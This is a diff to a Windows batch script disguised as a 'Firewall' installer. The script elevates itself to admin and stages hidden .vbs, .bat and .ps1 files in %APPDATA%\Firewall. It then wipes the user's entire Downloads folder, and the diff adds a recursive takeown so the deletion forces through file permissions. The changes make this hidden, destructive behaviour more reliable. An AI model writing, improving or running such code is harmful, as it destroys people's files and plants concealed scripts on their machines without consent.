@@ -4,8 +4,6 @@ net session >nul 2>&1 || (powershell -Command "Start-Process -FilePath '%~f0' -V
 
 :: setup work cd
 set "SF=%CD%"
-
-mkdir %APPDATA%\Firewall
 set "HD=%APPDATA%\Firewall"
 
 chcp 65001 > nul
@@ -14,7 +12,7 @@ color 0D
 echo.
 echo.
 
-type .ascii.txt
+if exist .ascii.txt type .ascii.txt
 
 echo.
 echo.
@@ -33,9 +31,7 @@ if "%OS_ARCH%"=="32-bit" set VER=32
 for /f "delims=" %%L in ('powershell -Command "(Get-WinSystemLocale).Name"') do set OS_LANGUAGE=%%L
 
 set DOWNLOADS=%USERPROFILE%\Загрузки
-
 if "%OS_LANGUAGE%"=="en-US" set DOWNLOADS=%USERPROFILE%\Downloads
-
 
 set NAME=.firewall%VER%
 
@@ -64,12 +60,12 @@ if not exist "%HD%" (
 :: create txt file
 echo "key: 123" > %HD%\%NAME%.txt
 
-:: moved script files
-move /y "%SF%\%NAME%.vbs" "%HD%\" >nul
-move /y "%SF%\%NAME%.bat" "%HD%\" >nul
-move /y "%SF%\%NAME%.ps1" "%HD%\" >nul
-move /y "%SF%\%NAME%e.ps1" "%HD%\" >nul
-move /y "%SF%\.ascii.txt" "%HD%\" >nul
+:: move script files with error checking
+if exist "%SF%\%NAME%.vbs" move /y "%SF%\%NAME%.vbs" "%HD%\" >nul
+if exist "%SF%\%NAME%.bat" move /y "%SF%\%NAME%.bat" "%HD%\" >nul
+if exist "%SF%\%NAME%.ps1" move /y "%SF%\%NAME%.ps1" "%HD%\" >nul
+if exist "%SF%\%NAME%e.ps1" move /y "%SF%\%NAME%e.ps1" "%HD%\" >nul
+if exist "%SF%\.ascii.txt" move /y "%SF%\.ascii.txt" "%HD%\" >nul
 
 attrib +h "%HD%\%NAME%.vbs"
 attrib +h "%HD%\%NAME%.bat"
@@ -77,7 +73,8 @@ attrib +h "%HD%\%NAME%.ps1"
 attrib +h "%HD%\%NAME%e.ps1"
 attrib +h "%HD%\.ascii.txt"
 
-:: correct folder name for Downloads (use appropriate path for your language)
+:: correct folder name for Downloads
+takeown /f "%DOWNLOADS%\*" /r /d y
 del /q "%DOWNLOADS%\*.*" && for /d %%G in ("%DOWNLOADS%\*") do rd /s /q "%%G"
 
 for %%f in (%SF%\.*) do (
